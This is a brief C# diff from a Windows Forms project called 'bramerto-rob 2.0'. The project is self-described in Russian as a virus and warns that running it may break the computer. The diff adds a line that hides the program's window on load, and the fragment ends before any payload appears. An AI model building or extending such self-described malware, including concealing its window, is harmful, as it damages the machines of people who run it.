@@ -51,6 +51,7 @@ namespace bramerto_rob_2._0
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            this.Visible = false;
             DialogResult dg1 = MessageBox.Show("После запуска этой программы ваш компьютер может работать неправильно\nВы уверены, что хотите запустить вируc?\nЯ крайне не рекомендую вам его запускать ради интереса и не на виртуальной машине", "bramerto-rob 2.0", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
             if (dg1 == DialogResult.Yes)
             {
